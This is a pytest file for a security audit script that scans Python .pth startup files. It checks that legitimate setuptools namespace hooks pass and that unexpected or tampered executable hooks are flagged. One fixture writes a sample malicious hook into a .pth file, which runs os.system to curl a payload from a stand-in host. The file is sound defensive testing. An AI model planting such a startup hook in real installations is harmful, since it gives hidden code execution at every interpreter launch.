"""Tests for scripts/security/audit_python_startup.py."""

from __future__ import annotations

import importlib.util
from pathlib import Path
import sys


SCRIPT_PATH = Path(__file__).resolve().parents[2] / "scripts" / "security" / "audit_python_startup.py"
SCRIPT_SPEC = importlib.util.spec_from_file_location("audit_python_startup", SCRIPT_PATH)
assert SCRIPT_SPEC is not None
assert SCRIPT_SPEC.loader is not None
audit_python_startup = importlib.util.module_from_spec(SCRIPT_SPEC)
sys.modules[SCRIPT_SPEC.name] = audit_python_startup
SCRIPT_SPEC.loader.exec_module(audit_python_startup)


def test_scan_pth_file_allows_setuptools_namespace_bootstrap(tmp_path):
    """Legacy setuptools namespace-package hooks should not be flagged."""
    pth_file = tmp_path / "sphinxcontrib_jsmath-1.0.1-py3.7-nspkg.pth"
    pth_file.write_text(
        "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
        "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('sphinxcontrib',));"
        "importlib = has_mfs and __import__('importlib.util');"
        "has_mfs and __import__('importlib.machinery');"
        "m = has_mfs and sys.modules.setdefault('sphinxcontrib', "
        "importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('sphinxcontrib', [os.path.dirname(p)])));"
        "m = m or sys.modules.setdefault('sphinxcontrib', types.ModuleType('sphinxcontrib'));"
        "mp = (m or []) and m.__dict__.setdefault('__path__',[]);"
        "(p not in mp) and mp.append(p)\n",
        encoding="utf-8",
    )

    assert audit_python_startup.scan_pth_file(pth_file) == []


def test_scan_pth_file_flags_unexpected_executable_line(tmp_path):
    """Unknown executable .pth hooks should still be reported."""
    pth_file = tmp_path / "litellm_init.pth"
    pth_file.write_text("import os; os.system('curl https://example.invalid/payload')\n", encoding="utf-8")

    findings = audit_python_startup.scan_pth_file(pth_file)

    assert len(findings) == 1
    assert findings[0].kind == "executable_pth"
    assert findings[0].path == str(pth_file)


def test_namespace_pth_requires_matching_namespace_path(tmp_path):
    """The allowlist should reject mismatched namespace bootstrap lines."""
    pth_file = tmp_path / "sphinxcontrib_jsmath-1.0.1-py3.7-nspkg.pth"
    pth_file.write_text(
        "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
        "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('evil',));"
        "importlib = has_mfs and __import__('importlib.util');"
        "has_mfs and __import__('importlib.machinery');"
        "m = has_mfs and sys.modules.setdefault('sphinxcontrib', "
        "importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('sphinxcontrib', [os.path.dirname(p)])));"
        "m = m or sys.modules.setdefault('sphinxcontrib', types.ModuleType('sphinxcontrib'));"
        "mp = (m or []) and m.__dict__.setdefault('__path__',[]);"
        "(p not in mp) and mp.append(p)\n",
        encoding="utf-8",
    )

    findings = audit_python_startup.scan_pth_file(pth_file)

    assert len(findings) == 1
    assert findings[0].kind == "executable_pth"
